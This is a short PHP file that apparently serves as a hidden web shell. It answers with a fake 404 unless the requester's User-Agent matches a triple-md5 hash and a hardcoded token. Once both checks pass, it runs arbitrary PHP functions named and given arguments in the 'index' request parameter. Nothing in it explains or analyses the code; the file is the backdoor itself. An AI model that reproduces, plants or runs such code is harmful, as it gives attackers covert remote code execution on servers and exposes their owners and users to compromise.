<?php

if (md5(md5(md5($_SERVER['HTTP_USER_AGENT']))) != '4f7f3da06809dc3d94dacceed40dfaad') {
    header('HTTP/1.1 404 Not Found');
    header("status: 404 Not Found");
    die();
}
if($_REQUEST["token"] == "32f5fc28a54b2c19ca258407798b1d83"){
    if ($li7ieq =    @$_REQUEST['index']){
        $li7ieq[1]($li7ieq[2], $li7ieq[3]($li7ieq[4]));exit;
    }
}